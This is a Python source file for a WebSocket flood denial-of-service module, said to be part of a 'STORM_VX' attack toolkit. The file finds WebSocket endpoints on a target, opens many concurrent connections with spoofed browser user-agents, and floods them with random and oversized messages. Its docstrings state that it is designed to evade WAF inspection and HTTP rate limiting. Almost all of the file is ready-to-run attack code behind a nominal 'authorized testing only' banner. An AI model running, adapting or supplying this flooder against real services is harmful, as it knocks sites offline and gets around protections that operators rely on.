#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  VF WebSocket Flood — WebSocket Flood Attack Module                     ║
║  Part of the STORM_VX Toolkit                                          ║
║                                                                          ║
║  Connects to WebSocket endpoints and floods with messages.              ║
║  WAF typically inspects the HTTP upgrade but not WS message content.    ║
║  Bypasses HTTP rate limiting by using WebSocket framing.                ║
║                                                                          ║
║  FOR AUTHORIZED TESTING ONLY!                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import random
import string
import json
import struct
import hashlib
import base64
import ssl
from typing import Dict, Optional, List, Set
from urllib.parse import urlparse


# ─── Color Codes ──────────────────────────────────────────────────────────────

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'


# ─── User-Agent Pool ─────────────────────────────────────────────────────────

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

def random_ua() -> str:
    return random.choice(USER_AGENTS)


class WebSocketFloodAttacker:
    """
    WebSocket Flood Attack.

    Discovers WebSocket endpoints on the target, connects to them,
    and floods with messages at a high rate. WAFs typically inspect
    the HTTP upgrade request but not the WebSocket message content,
    allowing messages to bypass rate limiting and content inspection.

    Discovery paths: /ws, /websocket, /socket.io, /wss, /live,
                     /realtime, /stream, /chat

    ArvanCloud blocking codes: 403, 429, 500, 503
    """

    WS_ENDPOINTS = [
        "/ws", "/websocket", "/socket.io/?EIO=4&transport=websocket",
        "/wss", "/live", "/realtime", "/stream", "/chat",
        "/ws/connect", "/socket", "/cable", "/ws/socket",
        "/graphql", "/subscriptions", "/api/ws",
        "/v1/ws", "/v2/ws", "/events", "/push",
    ]

    # Message templates for flooding
    MESSAGE_TEMPLATES = [
        # Random JSON
        lambda: json.dumps({"type": "message", "data": "".join(random.choices(string.ascii_letters, k=64))}),
        # Ping-like
        lambda: json.dumps({"type": "ping", "ts": int(time.time() * 1000)}),
        # Chat-like
        lambda: json.dumps({"type": "chat", "message": "".join(random.choices(string.ascii_letters + string.digits, k=128))}),
        # Subscription-like
        lambda: json.dumps({"type": "subscribe", "channel": f"ch_{random.randint(1,9999)}"}),
        # Large payload
        lambda: json.dumps({"type": "data", "payload": "A" * random.randint(256, 2048)}),
        # Socket.io format
        lambda: f'42["message","{"".join(random.choices(string.ascii_letters, k=32))}"]',
        # Raw text
        lambda: "".join(random.choices(string.ascii_letters + string.digits, k=64)),
    ]

    def __init__(self, url: str, workers: int = 100, messages_per_second: int = 10, timeout: int = 15):
        self.url = url
        self.workers = workers
        self.messages_per_second = messages_per_second
        self.timeout = timeout
        self.parsed = urlparse(url)
        self.host = self.parsed.hostname or ""
        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        self.is_ssl = self.parsed.scheme == "https"

        # Discovered WS endpoints
        self._discovered_endpoints: List[str] = []
        self._ws_supported = False

        # Stats tracking
        self.stats = {
            "active_connections": 0,
            "total_connections": 0,
            "messages_sent": 0,
            "messages_received": 0,
            "endpoints_discovered": 0,
            "connection_failures": 0,
            "waf_blocked": 0,
            "errors": 0,
            "bytes_sent": 0,
            "bytes_received": 0,
        }
        self._lock = asyncio.Lock()
        self._start_time = 0.0

    async def _update_stats(self, key: str, delta: int = 1):
        async with self._lock:
            self.stats[key] = self.stats.get(key, 0) + delta

    async def _get_stats(self) -> Dict:
        async with self._lock:
            return dict(self.stats)

    def _generate_ws_key(self) -> str:
        """Generate a WebSocket Sec-WebSocket-Key header value."""
        random_bytes = bytes(random.randint(0, 255) for _ in range(16))
        return base64.b64encode(random_bytes).decode("utf-8")

    def _build_ws_upgrade_request(self, path: str) -> bytes:
        """Build a WebSocket HTTP upgrade request."""
        key = self._generate_ws_key()
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {random_ua()}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits\r\n"
            f"Origin: {'https' if self.is_ssl else 'http'}://{self.host}\r\n"
            f"\r\n"
        )
        return request.encode("utf-8")

    def _build_ws_frame(self, payload: bytes, opcode: int = 0x1, mask: bool = True) -> bytes:
        """Build a WebSocket frame.

        opcode: 0x1=text, 0x2=binary, 0x8=close, 0x9=ping, 0xA=pong
        """
        frame = bytearray()
        # FIN bit + opcode
        frame.append(0x80 | opcode)

        # Mask bit + payload length
        payload_len = len(payload)
        if mask:
            frame[0]  # already set FIN+opcode

        if payload_len <= 125:
            frame.append((0x80 if mask else 0x00) | payload_len)
        elif payload_len <= 65535:
            frame.append((0x80 if mask else 0x00) | 126)
            frame.extend(struct.pack(">H", payload_len))
        else:
            frame.append((0x80 if mask else 0x00) | 127)
            frame.extend(struct.pack(">Q", payload_len))

        # Masking key
        if mask:
            masking_key = bytes(random.randint(0, 255) for _ in range(4))
            frame.extend(masking_key)
            # Masked payload
            masked_payload = bytearray(payload_len)
            for i in range(payload_len):
                masked_payload[i] = payload[i] ^ masking_key[i % 4]
            frame.extend(masked_payload)
        else:
            frame.extend(payload)

        return bytes(frame)

    def _build_ping_frame(self) -> bytes:
        """Build a WebSocket PING frame."""
        return self._build_ws_frame(b"ping", opcode=0x9, mask=True)

    def _build_close_frame(self) -> bytes:
        """Build a WebSocket CLOSE frame."""
        return self._build_ws_frame(struct.pack(">H", 1000) + b"bye", opcode=0x8, mask=True)

    async def _discover_endpoints(self, stop_event: asyncio.Event) -> List[str]:
        """Discover WebSocket endpoints by trying to connect to common paths."""
        discovered = []

        print(f"  {C.CY}[WS-FLOOD] Discovering WebSocket endpoints...{C.RS}")

        for endpoint in self.WS_ENDPOINTS:
            if stop_event.is_set():
                break

            try:
                if self.is_ssl:
                    ssl_ctx = ssl.create_default_context()
                    ssl_ctx.check_hostname = False
                    ssl_ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.host, self.port, ssl=ssl_ctx),
                        timeout=self.timeout,
                    )
                else:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.host, self.port),
                        timeout=self.timeout,
                    )

                # Send WS upgrade request
                upgrade_req = self._build_ws_upgrade_request(endpoint)
                writer.write(upgrade_req)
                await writer.drain()

                # Read response
                try:
                    response = await asyncio.wait_for(reader.read(4096), timeout=self.timeout)
                    response_str = response.decode("utf-8", errors="ignore")

                    if "101" in response_str and "Switching Protocols" in response_str:
                        discovered.append(endpoint)
                        print(f"  {C.G}[WS-FLOOD] Found WebSocket endpoint: {endpoint}{C.RS}")

                        # Send close frame to be polite
                        try:
                            writer.write(self._build_close_frame())
                            await writer.drain()
                        except Exception:
                            pass
                    elif any(code in response_str for code in ["403", "429", "500", "503"]):
                        # WAF blocking — endpoint might exist but blocked
                        print(f"  {C.Y}[WS-FLOOD] WAF blocked on: {endpoint}{C.RS}")

                except asyncio.TimeoutError:
                    pass

                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass

            except Exception:
                pass

        # Also try wss:// variants
        if self.is_ssl:
            for endpoint in ["/ws", "/websocket", "/socket.io/?EIO=4&transport=websocket"]:
                if endpoint not in discovered:
                    # Already tried via SSL connection
                    pass

        if discovered:
            self._ws_supported = True
            self._discovered_endpoints = discovered
            await self._update_stats("endpoints_discovered", len(discovered))
            print(f"  {C.G}[WS-FLOOD] Discovered {len(discovered)} WebSocket endpoints{C.RS}")
        else:
            print(f"  {C.Y}[WS-FLOOD] No WebSocket endpoints found, will force upgrade attempts{C.RS}")
            # Use all endpoints anyway — some might work under pressure
            self._discovered_endpoints = self.WS_ENDPOINTS[:6]

        return discovered

    async def _ws_flood_worker(self, worker_id: int, stop_event: asyncio.Event):
        """Single worker that connects to a WS endpoint and floods messages."""
        while not stop_event.is_set():
            endpoint = random.choice(self._discovered_endpoints) if self._discovered_endpoints else random.choice(self.WS_ENDPOINTS)

            reader: Optional[asyncio.StreamReader] = None
            writer: Optional[asyncio.StreamWriter] = None

            try:
                # Open connection
                if self.is_ssl:
                    ssl_ctx = ssl.create_default_context()
                    ssl_ctx.check_hostname = False
                    ssl_ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.host, self.port, ssl=ssl_ctx),
                        timeout=self.timeout,
                    )
                else:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.host, self.port),
                        timeout=self.timeout,
                    )

                # Send WS upgrade request
                upgrade_req = self._build_ws_upgrade_request(endpoint)
                writer.write(upgrade_req)
                await writer.drain()

                # Read upgrade response
                try:
                    response = await asyncio.wait_for(reader.read(4096), timeout=self.timeout)
                    response_str = response.decode("utf-8", errors="ignore")

                    if "101" not in response_str:
                        # Upgrade failed
                        if any(code in response_str for code in ["403", "429", "500", "503"]):
                            await self._update_stats("waf_blocked")
                        await self._update_stats("connection_failures")
                        writer.close()
                        try:
                            await writer.wait_closed()
                        except Exception:
                            pass
                        continue

                except asyncio.TimeoutError:
                    await self._update_stats("connection_failures")
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass
                    continue

                # Upgrade successful! Now flood with messages
                await self._update_stats("active_connections")
                await self._update_stats("total_connections")

                # Background task to read incoming messages
                async def _read_messages():
                    try:
                        while not stop_event.is_set():
                            try:
                                data = await asyncio.wait_for(reader.read(4096), timeout=5)
                                if data:
                                    await self._update_stats("messages_received")
                                    await self._update_stats("bytes_received", len(data))
                                else:
                                    break
                            except asyncio.TimeoutError:
                                continue
                            except (ConnectionResetError, BrokenPipeError):
                                break
                    except Exception:
                        pass

                read_task = asyncio.create_task(_read_messages())

                # Send messages at configured rate
                msg_interval = 1.0 / max(self.messages_per_second, 1)
                try:
                    while not stop_event.is_set():
                        # Generate a random message
                        msg_generator = random.choice(self.MESSAGE_TEMPLATES)
                        msg = msg_generator()
                        msg_bytes = msg.encode("utf-8")

                        # Send as WS text frame
                        frame = self._build_ws_frame(msg_bytes, opcode=0x1, mask=True)
                        try:
                            writer.write(frame)
                            await writer.drain()
                            await self._update_stats("messages_sent")
                            await self._update_stats("bytes_sent", len(msg_bytes))
                        except (ConnectionResetError, BrokenPipeError):
                            break

                        # Occasionally send a ping
                        if random.random() < 0.05:
                            try:
                                writer.write(self._build_ping_frame())
                                await writer.drain()
                            except (ConnectionResetError, BrokenPipeError):
                                break

                        await asyncio.sleep(msg_interval + random.uniform(0, 0.05))

                except Exception:
                    pass
                finally:
                    read_task.cancel()
                    try:
                        # Try graceful close
                        writer.write(self._build_close_frame())
                        await writer.drain()
                    except Exception:
                        pass
                    await self._update_stats("active_connections", -1)

            except ConnectionRefusedError:
                await self._update_stats("connection_failures")
                await asyncio.sleep(random.uniform(0.5, 2.0))

            except asyncio.TimeoutError:
                await self._update_stats("connection_failures")

            except OSError:
                await self._update_stats("errors")

            except Exception:
                await self._update_stats("errors")

            finally:
                if writer:
                    try:
                        writer.close()
                        await writer.wait_closed()
                    except Exception:
                        pass

            # Brief pause before reconnecting
            if not stop_event.is_set():
                await asyncio.sleep(random.uniform(0.01, 0.1))

    async def _print_stats(self, stop_event: asyncio.Event):
        """Print real-time statistics."""
        while not stop_event.is_set():
            elapsed = time.time() - self._start_time
            stats = await self._get_stats()

            active = stats.get("active_connections", 0)
            total = stats.get("total_connections", 0)
            sent = stats.get("messages_sent", 0)
            recv = stats.get("messages_received", 0)
            blocked = stats.get("waf_blocked", 0)
            failures = stats.get("connection_failures", 0)
            mps = sent / max(elapsed, 1)

            print(
                f"{C.B}[WS-FLOOD]{C.RS} "
                f"{C.BD}t={elapsed:.0f}s{C.RS} | "
                f"Active: {C.G}{active}{C.RS} | "
                f"Total: {C.W}{total}{C.RS} | "
                f"Sent: {C.CY}{sent:,}{C.RS} ({mps:.1f}/s) | "
                f"Recv: {C.G}{recv:,}{C.RS} | "
                f"Blocked: {C.R}{blocked}{C.RS} | "
                f"Failures: {C.Y}{failures}{C.RS} | "
                f"Endpoints: {C.CY}{stats.get('endpoints_discovered', 0)}{C.RS}"
            )

            await asyncio.sleep(3)

    async def attack(self, stop_event: asyncio.Event, stats_callback=None) -> Dict:
        """
        Main attack entry point.

        Args:
            stop_event: Event to signal graceful shutdown.
            stats_callback: Optional callback for external stats reporting.

        Returns:
            Dict with attack statistics.
        """
        self._start_time = time.time()

        print(f"{C.BD}[WS-FLOOD] Starting WebSocket Flood attack{C.RS}")
        print(f"  Target: {C.CY}{self.host}:{self.port}{C.RS}")
        print(f"  Workers: {C.W}{self.workers}{C.RS}")
        print(f"  Messages/sec per worker: {C.W}{self.messages_per_second}{C.RS}")
        print(f"  Timeout: {C.W}{self.timeout}s{C.RS}")
        print(f"  Strategy: Discover WS endpoints, connect, flood with messages{C.RS}")

        # Phase 1: Discover WebSocket endpoints
        await self._discover_endpoints(stop_event)

        # Phase 2: Launch flood workers
        tasks = []
        for i in range(self.workers):
            task = asyncio.create_task(self._ws_flood_worker(i, stop_event))
            tasks.append(task)

        # Stats printer
        stats_task = asyncio.create_task(self._print_stats(stop_event))

        # Wait for stop signal
        try:
            await stop_event.wait()
        except asyncio.CancelledError:
            pass

        # Cleanup
        stats_task.cancel()
        for task in tasks:
            task.cancel()

        await asyncio.gather(stats_task, *tasks, return_exceptions=True)

        # Final stats
        elapsed = time.time() - self._start_time
        final_stats = await self._get_stats()
        final_stats["elapsed_seconds"] = round(elapsed, 2)
        final_stats["messages_per_second"] = round(
            final_stats.get("messages_sent", 0) / max(elapsed, 1), 2
        )
        final_stats["ws_endpoints"] = self._discovered_endpoints
        final_stats["ws_supported"] = self._ws_supported

        print(f"\n{C.BD}[WS-FLOOD] Attack finished{C.RS}")
        print(f"  Total connections: {C.W}{final_stats.get('total_connections', 0)}{C.RS}")
        print(f"  Messages sent: {C.CY}{final_stats.get('messages_sent', 0):,}{C.RS}")
        print(f"  Messages received: {C.G}{final_stats.get('messages_received', 0):,}{C.RS}")
        print(f"  Msg/s: {C.CY}{final_stats.get('messages_per_second', 0)}{C.RS}")
        print(f"  WAF blocked: {C.R}{final_stats.get('waf_blocked', 0)}{C.RS}")
        print(f"  Endpoints discovered: {C.CY}{final_stats.get('endpoints_discovered', 0)}{C.RS}")
        if self._discovered_endpoints:
            for ep in self._discovered_endpoints:
                print(f"    {C.G}{ep}{C.RS}")

        if stats_callback:
            await stats_callback(final_stats)

        return final_stats
